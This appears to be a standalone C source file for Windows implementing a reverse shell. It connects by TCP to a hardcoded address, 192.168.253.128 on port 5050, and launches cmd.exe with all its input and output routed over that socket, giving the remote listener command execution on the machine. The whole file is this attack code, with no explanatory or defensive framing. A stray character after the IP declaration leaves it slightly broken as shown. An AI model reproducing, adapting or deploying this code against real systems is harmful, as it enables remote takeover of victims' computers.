#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib , "Ws2_32.lib");

SOCKET shell;
sockaddr_in shell_addr;
WSADATA wsa;
char ip_addr[]="192.168.253.128";s
int port = 5050;
int conn;
STARTUPINFO si;
PROCESS_INFORMATION pi;
char receiver[512];


int main(){
	WSAStartup(MAKEWORD(2,2) , &wsa);
	shell = WSASocket(AF_INET , SOCK_STREAM, IPPROTO_TCP , NULL , 0 , 0);
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_port = htons(port);
	shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
	SOCKADDR* pShellAddr = (SOCKADDR*)&shell_addr;

	conn = WSAConnect(shell , pShellAddr , sizeof(shell_addr) , NULL , NULL , NULL , NULL);

	if(conn == SOCKET_ERROR ){
		printf("CONNECTION ERROR!!!");
		exit(0);
	}

	else{
		recv(shell , receiver , sizeof(receiver) , 0);
		si.cb = sizeof(si);
		si.dwFlags = (STARTF_USESTDHANDLES);
		si.hStdInput = (HANDLE)shell;
		si.hStdOutput = (HANDLE)shell;
		si.hStdError = (HANDLE)shell;

		LPSTR processNAME = (LPSTR)"cmd.exe";
		CreateProcess(NULL , processNAME , NULL , NULL , TRUE , 0 , NULL , NULL , &si , &pi);

		WaitForSingleObject(pi.hProcess , INFINITE);

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);

		return 0;

	}
}
